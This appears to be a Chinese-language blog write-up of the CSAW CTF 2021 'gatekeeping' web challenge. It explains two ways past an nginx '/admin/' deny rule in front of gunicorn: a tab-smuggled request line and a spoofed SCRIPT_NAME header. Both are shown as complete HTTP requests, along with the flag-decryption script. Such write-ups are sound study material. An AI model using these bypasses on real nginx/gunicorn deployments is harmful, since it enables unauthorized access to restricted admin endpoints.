---
title: "nginx + gunicorn reverse proxy exploit"
date: 2021-09-15 00:54:15 +0800
tags:
  - CTF
  - Write-up
  - Web
  - Reverse Proxy
  - nginx
  - gunicorn
categories:
  - Security
---

Case study: 2021 CSAW CTF Qual - gatekeeping

## Intro

這次自己參加了CSAW CTF Qual，web最後只解了兩題...

不過看完其他題的解答後，我覺得最後沒解出來的幾題都不是很難

但沒給source code，漏洞的位置又有點太guessy了，真好奇別人是怎麼通靈或Fuzz出來的

撇除那幾題，我覺得gatekeeping這題非常有趣，所以拿出來寫個writeup，紀錄一下這題的兩個解法

## gatekeeping [Web]

### Overview

首先先看一下題目的主邏輯:

```python
def get_info():
    key = request.headers.get('key_id')
    if not key:
        abort(400, 'Missing key id')
    if not all(c in '0123456789ABCDEFabcdef'
            for c in key):
        abort(400, 'Invalid key id format')
    path = os.path.join('/server/keys',key)
    if not os.path.exists(path):
        abort(401, 'Unknown encryption key id')
    with open(path,'r') as f:
        return json.load(f)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/decrypt', methods=['POST'])
def decrypt():
    info = get_info()
    if not info.get('paid', False):
        abort(403, 'Ransom has not been paid')

    key = binascii.unhexlify(info['key'])
    data = request.get_data()
    iv = data[:AES.block_size]

    data = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CFB, iv)

    return cipher.decrypt(data)

@app.route('/admin/key')
def get_key():
    return jsonify(key=get_info()['key'])
```

而題目有給一個`flag.txt.enc`，所以目標應該是透過存取`/admin/key`來拿到key來解密，但題目肯定不會這麼簡單

接下來可以看到這個題目用了nginx的reverse proxy，規則如下:

```conf
server {
    listen 80;

    underscores_in_headers on;

    location / {
        include proxy_params;

        # Nginx uses the WSGI protocol to transmit the request to gunicorn through the domain socket
        # We do this so the network can't connect to gunicorn directly, only though nginx
        proxy_pass http://unix:/tmp/gunicorn.sock;
        proxy_pass_request_headers on;

        # INFO(brad)
        # Thought I would explain this to clear it up:
        # When we make a request, nginx forwards the request to gunicorn.
        # Gunicorn then reads the request and calculates the path (which is put into the WSGI variable `path_info`)
        #
        # We can prevent nginx from forwarding any request starting with "/admin/". If we do this
        # there is no way for gunicorn to send flask a `path_info` which starts with "/admin/"
        # Thus any flask route starting with /admin/ should be safe :)
        location ^~ /admin/ {
            deny all;
        }
    }
}
```

可以看到`/admin/`目錄底下用了deny all，如果不是`/admin/`，則直接`proxy_pass`給gunicorn的backend

也就是如果單純使用`/admin/key`來拿到key，是不可能的，需要利用nginx與gunicorn理解不同的方式來繞過這個限制

### Exploit

比賽當下我解掉的方式是利用nginx misconfiguration

可以看到proxy_pass並沒有trailing with slash

所以nginx並不會normalize後面的path

也就是當我的request是:

```yaml
GET /admin/key	HTTP/1.1/../../../ HTTP/1.1
Host: web.chal.csaw.io:5004
Pragma: no-cache
key_id: 05d1dc92ce82cc09d9d7ff1ac9d5611d
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

nginx看到`GET /admin/key\x09HTTP/1.1/../../../ HTTP/1.1`時，會認為`key\x09HTTP`是一個路徑名稱，所以最終指向的路徑會是`/`，會通過`location ^~ /admin/`的檢查

但guinicorn收到來自nginx轉發的`GET /admin/key\x09HTTP/1.1/../../../ HTTP/1.1`時，會只讀到`\x09HTTP/1.1`就停止，省略之後的內容，所以最終指向的路徑是`/admin/key`，成功拿到key

> Note:
>
> 那時解掉這題的時候沒有在local測試，因為題目給的Dockerfile build起來會噴error...，後來為了寫writeup，所以在local嘗試寫一個簡單的app來reproduce，但卻一直都是400 bad request
>
> 後來發現題目的的nginx是用apt-get安裝的，而ubuntu預設安裝的版本是1.18，而在nginx 1.21.1後，遇到tab在request中的時候，都會直接error了
>
> nginx Changelog: [http://nginx.org/en/CHANGES](http://nginx.org/en/CHANGES)
>
>> *) Change: now nginx always returns an error if spaces or control characters are used in the request line.
>
> 所以如果看到這篇文章，想玩這個exploit的人可能要注意一下版本，新版已經沒用了

剩下只需要按照主程式邏輯把`flag.txt.enc`用拿到的key去decrypt就拿到flag了

```python
from Crypto.Cipher import AES
import binascii


def decrypt(key):
    key = binascii.unhexlify(key)
    with open("flag.txt.enc", "rb") as f:
        data = f.read()
        iv = data[:AES.block_size]

        data = data[AES.block_size:]
        cipher = AES.new(key, AES.MODE_CFB, iv)

        return cipher.decrypt(data)


def main():
    key = "b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3"
    print(decrypt(key))  # b'o\x8f|\x10\xd4GJ\x8b\x14\xd6\x0f\xe7g\xc1/\xc5flag{gunicorn_probably_should_not_do_that}'


if __name__ == '__main__':
    main()
```

### Exploit 2

除了剛剛那招以外，還有另一種方式繞過檢查，就是使用`SCRIPT_NAME`功能

> What is `SCRIPT_NAME`?
>
> PEP333: [https://www.python.org/dev/peps/pep-0333/](https://www.python.org/dev/peps/pep-0333/)
>
> SCRIPT_NAME
>
> The initial portion of the request URL's "path" that corresponds to the application object, so that the application knows its virtual "location". This may be an empty string, if the application corresponds to the "root" of the server.

可以看到`SCRIPT_NAME`可以改變一個url的base path

也就是當`SCRIPT_NAME`是`test`的時候：

`/a/b/test/flag` => `/flag`

了解這個功能後，可以再看一下gunicorn的wsgi的功能：

> [https://docs.gunicorn.org/en/stable/faq.html](https://docs.gunicorn.org/en/stable/faq.html)
>
> By default SCRIPT_NAME is an empty string. The value could be set by setting SCRIPT_NAME in the environment or as **an HTTP header**.

gunicorn的`SCRIPT_NAME`可以被HTTP header設定!

只是這裡有個限制，就是nginx必須開啟`underscores_in_headers`的功能，這樣包含`_`的header才可以順利傳進去

這裡也剛好開啟了，所以只要使用:

```yaml
GET /a/admin/key HTTP/1.1
Host: web.chal.csaw.io:5004
Pragma: no-cache
key_id: 05d1dc92ce82cc09d9d7ff1ac9d5611d
SCRIPT_NAME: a
```

就能順利拿key了！
